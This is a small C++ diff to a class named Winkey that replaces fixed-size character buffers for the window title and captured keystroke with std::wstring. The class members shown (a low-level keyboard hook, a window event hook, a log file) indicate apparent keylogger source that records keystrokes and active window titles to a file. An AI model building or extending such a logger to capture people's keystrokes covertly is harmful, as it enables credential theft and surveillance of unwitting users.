@@ -42,9 +42,9 @@ class	Winkey
 
 		const char				*_logFileName;
 		static std::wofstream	_logFile;
-		static wchar_t			_windowTitle[TW_WINTITLE_MAX];
+		static std::wstring		_windowTitle;
 		static HWND				_currentWindow;
-		static wchar_t			_keyStroke[TW_KEYSTROKE_MAX];
+		static std::wstring		_keyStroke;
 		HANDLE					_singleInstanceMutex;
 		HWINEVENTHOOK			_winEventHook;
 		HHOOK   				_keyboardHook;
